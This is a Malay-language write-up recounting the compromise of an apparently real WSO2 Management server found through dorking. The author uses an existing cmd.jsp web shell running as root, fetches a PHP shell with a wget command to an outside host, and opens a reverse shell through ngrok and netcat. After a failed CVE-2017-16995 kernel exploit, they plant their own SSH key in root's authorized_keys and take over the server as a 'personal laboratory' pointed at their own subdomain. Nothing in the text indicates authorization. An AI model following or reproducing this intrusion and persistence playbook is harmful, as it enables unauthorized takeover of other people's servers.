# Write-Up [WSO2 Management]

Assalamualaikum, so harini nak buat writeup dari PoC [WSO2 Management] kepada SSH(berserta Privilege Escalation).

Disini saya telah berjaya meng-eksploitasi satu urls dengan menggunakan teknik dorking.

![Screenshot_251](https://user-images.githubusercontent.com/21289340/233838651-b3cd945d-9286-4ab6-b4fe-d4181f012cfc.png)

Setelah saya berjaya meng-eksploitasi urls tersebut, saya terus mencuba mendapatkan user dengan menggunakan `whoami`.
Disini mungkin agak sedikit "LUCKY" apabila output yang tampil adalah "root".

![Screenshot_4](https://user-images.githubusercontent.com/21289340/233838875-c2a7ec20-1738-467d-9932-51794a527bfd.png)

Seperti biasa, saya akan mencuba untuk melakukan pencarian untuk mencari aplikasi yang tersedia seperti php, python, apache2, nginx, perl, wget dan curl.
Sebelumnya php dan apache2 tidak tersedia di dalam server. Kemudian saya cuba untuk menginstall secara direct melalui basic unix command disebabkan privilege yang telah ada iaitu 'root', di bawah ini adalah output ditampilkan setelah saya berjaya menginstall package tersebut.

![Screenshot_253](https://user-images.githubusercontent.com/21289340/233839227-11762819-8976-4c4d-bc08-20a7ba9787bb.png)
![Screenshot_243](https://user-images.githubusercontent.com/21289340/233839297-0b89acab-46b6-4613-87ae-6b9de6d89f8f.png)

Seterusnya, saya ingin membuat back-connect, kerana shell yang tersedia iaitu "cmd.jsp" tidak memuaskan dan mungkin jalan kerja terlalu banyak.
Lalu saya cuba memanggil php shell dengan menggunakan 'wget myshell.my/raw.txt -O corntoll.php'.
Dibawah ini adalah tampilan setelah saya berjaya memanggil file php tersebut.

![Screenshot_21](https://user-images.githubusercontent.com/21289340/233839663-58ee9510-a961-4cc2-bc8c-c2a0578e0724.png)

Dan dibawah ini adalah tampilan setelah saya berjaya mengexecute corntall.php

![Screenshot_254](https://user-images.githubusercontent.com/21289340/233839590-01632a7d-dc0e-4bbd-a97d-d201aaae1a31.png)

Seterusnya, saya terus membuat back-connect/reverse php shell tersebut.

![Screenshot_9](https://user-images.githubusercontent.com/21289340/233839749-e4bccb03-9c77-4ac1-b215-eaf3cec304da.png)

Kemudian, saya listen seperti biasa menggunakan ngrok dan netcat.

![Screenshot_8](https://user-images.githubusercontent.com/21289340/233839800-99cfcaa3-3708-4872-b962-15c25c72f0f4.png)

Lalu, back-connect/reverse telah berjaya dilakukan.

![Screenshot_255](https://user-images.githubusercontent.com/21289340/233839892-6b79cd2f-5895-4893-808f-fcd58adbc4bc.png)

Disini saya memanggil fully interactive TTYs menggunakan Python3. Seterusnya, saya cuba mendapatkan user.

![Screenshot_11](https://user-images.githubusercontent.com/21289340/233840096-c8307a44-ab63-471e-a823-a2ff851d9f58.png)

Saya cuba untuk mendapatkan akses 'ROOT' daripada back-connect dengan cara mengeksploitasi CVE-2017-16995.

![Screenshot_22](https://user-images.githubusercontent.com/21289340/233840258-926a6fc8-2e39-4bc6-b3f3-35aa04bf1623.png)
![Screenshot_259](https://user-images.githubusercontent.com/21289340/233841650-b66761ff-bd93-4c88-8185-812c336bf98e.png)

Tetapi ianya gagal setelah saya compile dan cuba untuk meng-eksploitasi kernel tersebut. Mungkin disebabkan version kernel server dan CVE agak berbeza tiga angka?

![Screenshot_12](https://user-images.githubusercontent.com/21289340/233840359-1d9558f7-faa7-4a2b-9205-5ea091398a61.png)

Disini saya juga telah mencuba membuat 'chown' dan 'chmod +x' untuk memastikan CVE tersebut mendapatkan akses permission yang lengkap namun gagal.

![Screenshot_13](https://user-images.githubusercontent.com/21289340/233840470-60d57594-b262-499a-9daf-4b53210b1082.png)
![Screenshot_14](https://user-images.githubusercontent.com/21289340/233840477-807c9c8c-6342-4765-a23d-5b8df941dff3.png)

Jadi, saya cuba untuk menggunakan cara lain dimana saya telah mendapat idea untuk menggunakan SSH. Disini saya membuat semakan sama ada aplikasi SSH sedang berjalan ataupun tidak.

![Screenshot_247](https://user-images.githubusercontent.com/21289340/233840715-20e3c028-11ec-4d67-a65f-63c7a5e546b2.png)
![Screenshot_249](https://user-images.githubusercontent.com/21289340/233840646-9005c029-ff75-499b-a8ad-1b72e722f25a.png)

Ianya menunjukkan bahawa SSH tidak active, jadi saya mengaktifkan aplikasi SSH tersebut seperti yang dibawah.

![Screenshot_256](https://user-images.githubusercontent.com/21289340/233840612-69994d7e-1524-4b33-bdbd-02bb88ceef58.png)

Setelah servis SSH aktif, saya terus cuba login tapi gagal dengan error yang ditampilkan dibawah.

![Screenshot_257](https://user-images.githubusercontent.com/21289340/233840786-fc5f1aa2-d87f-46e2-abfd-0d84b9e32757.png)

Jadi, saya cuba untuk generate ssh-key sendiri dan menambah public key tersebut ke file '/root/.ssh/authorized_keys' seperti yang ditampilkan. 

![Screenshot_16](https://user-images.githubusercontent.com/21289340/233840923-3a8981d8-6b47-441f-b3a2-934018ec87d2.png)

Lalu, saya terus cuba untuk login daripada console Powershell.

![Screenshot_17](https://user-images.githubusercontent.com/21289340/233840965-ef26b465-0493-47d0-90eb-e3a0cd466a76.png)

Apabila melihat login SSH telah berjaya, saya terus melakukan semakan user menggunakan 'whoami'.

![Screenshot_18](https://user-images.githubusercontent.com/21289340/233841040-f98a4bd4-a159-462b-bc56-2841b967ef4c.png)

"BOOM!" root. Bukan sahaja akses root, malah saya juga telah mendapatkan akses direct kepada SSH.
Sekarang ianya telah menjadi LABORATORY peribadi saya. Server itu juga telah dipointing kepada sub-domain saya sendiri.

![Screenshot_260](https://user-images.githubusercontent.com/21289340/233841801-2a15d8f2-9145-4da7-9df6-91d32e67b6b3.png)
![Screenshot_19](https://user-images.githubusercontent.com/21289340/233841860-723b822d-6d1a-4832-ab1a-7fe7f367c295.png)

Setelah melakukan penyiasatan dengan lebih lanjut, saya mendapati bahawa server tersebut menggunakan Tomcat Apache, dimana ianya menggunakan Java.
Disitu, 'cmd.jsp' telah di eksploitasi untuk mendapatkan akses SSH root. 

BIG THANKS TO PARI MALAM.
